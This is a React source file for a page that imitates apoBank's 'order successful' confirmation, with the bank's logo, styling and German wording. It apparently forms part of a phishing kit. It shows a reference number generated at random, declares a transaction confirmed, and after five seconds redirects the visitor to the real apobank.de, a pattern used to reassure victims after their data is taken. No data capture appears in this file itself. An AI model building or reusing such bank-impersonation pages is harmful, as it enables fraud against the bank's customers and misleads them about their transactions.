import { useEffect } from "react";
import { CheckCircle2, ChevronRight, HelpCircle } from "lucide-react";
import { useNavigate } from "react-router-dom";
import apoBankLogo from "@/assets/apobank-logo.svg";
import { Button } from "@/components/ui/button";

const Success = () => {
  const navigate = useNavigate();

  useEffect(() => {
    const t = setTimeout(() => {
      window.location.href = "https://www.apobank.de/";
    }, 5000);
    return () => clearTimeout(t);
  }, []);


  return (
    <div className="min-h-screen bg-[#f5f5f5] flex flex-col">
      <header className="w-full bg-white border-b border-border/40">
        <div className="max-w-6xl mx-auto px-4 py-3 flex items-center gap-4">
          <img src={apoBankLogo} alt="apoBank Logo" className="h-12 w-auto" />
        </div>
      </header>

      <div className="bg-[#f5f5f5] border-b border-border/40">
        <div className="max-w-6xl mx-auto px-4 sm:px-6 py-4">
          <div className="flex items-center gap-2 text-sm text-[#002776]">
            <button onClick={() => navigate("/")} className="hover:underline">Startseite</button>
            <ChevronRight className="h-3 w-3 text-foreground/60" />
            <span className="text-foreground/70">Bestätigung</span>
          </div>
          <h1 className="mt-2 text-2xl sm:text-3xl font-normal text-[#1a1a1a]">Auftrag erfolgreich</h1>
        </div>
      </div>

      <main className="flex-1 relative">
        <div className="max-w-6xl mx-auto px-4 sm:px-6 pt-6">
          <button className="flex items-center gap-2 text-sm text-[#002776]">
            <HelpCircle className="h-4 w-4" /> Fragen zu dieser Seite?
          </button>
        </div>

        <div className="flex items-start justify-center">
          <div className="mt-8 sm:mt-10 mb-16 w-[94%] max-w-[680px] bg-white rounded-[16px] shadow-[0_8px_30px_rgba(0,0,0,0.15)] border border-border/40 p-6 sm:p-10">
            <div className="flex flex-col items-center text-center py-6">
              <CheckCircle2 className="h-16 w-16 text-[#2e7d32] mb-4" strokeWidth={1.5} />
              <h2 className="text-xl sm:text-2xl text-[#1a1a1a] mb-3">
                Ihr Auftrag wurde erfolgreich bestätigt
              </h2>
              <p className="text-sm text-foreground/80 max-w-md">
                Vielen Dank. Ihre Transaktion wurde erfolgreich an die apoBank übermittelt und wird nun verarbeitet.
              </p>
            </div>

            <div className="border-t border-border/60 pt-6 mt-4 grid grid-cols-2 gap-x-6 gap-y-6">
              <div>
                <p className="text-sm text-[#002776] mb-2 font-medium">Referenznummer</p>
                <p className="text-sm text-foreground">REF-{Math.floor(100000 + Math.random() * 900000)}</p>
              </div>
              <div>
                <p className="text-sm text-[#002776] mb-2 font-medium">Datum</p>
                <p className="text-sm text-foreground">{new Date().toLocaleDateString("de-DE", { day: "2-digit", month: "long", year: "numeric" })}</p>
              </div>
              <div>
                <p className="text-sm text-[#002776] mb-2 font-medium">Status</p>
                <p className="text-sm text-foreground">Bestätigt</p>
              </div>
              <div>
                <p className="text-sm text-[#002776] mb-2 font-medium">Uhrzeit</p>
                <p className="text-sm text-foreground">{new Date().toLocaleTimeString("de-DE", { hour: "2-digit", minute: "2-digit" })}</p>
              </div>
            </div>

            <div className="flex justify-end items-center gap-4 pt-8">
              <Button
                onClick={() => navigate("/auth")}
                className="rounded-full bg-white border-[#002776] text-[#002776] hover:bg-white hover:text-[#002776] px-6"
                variant="outline"
              >
                Weiter
              </Button>
            </div>
          </div>
        </div>
      </main>
    </div>
  );
};

export default Success;
